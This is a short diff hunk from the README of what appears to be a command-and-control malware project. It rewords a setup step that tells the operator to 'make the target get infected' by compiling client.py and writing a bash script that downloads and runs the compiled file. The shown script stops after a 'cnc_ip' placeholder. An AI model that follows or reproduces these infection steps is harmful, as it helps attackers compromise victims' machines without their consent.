@@ -26,8 +26,7 @@
 4. create an installation file to make the target get infected and configure it on server.py and client.py
 for example:
 
-use a python compiler to compile client.py
-create the bash script that downloads the compiled file and runs it:
+use a python compiler to compile client.py then create the bash script that downloads the compiled file and runs it:
 ```
 #!/bin/bash
 cnc_ip="your cnc"
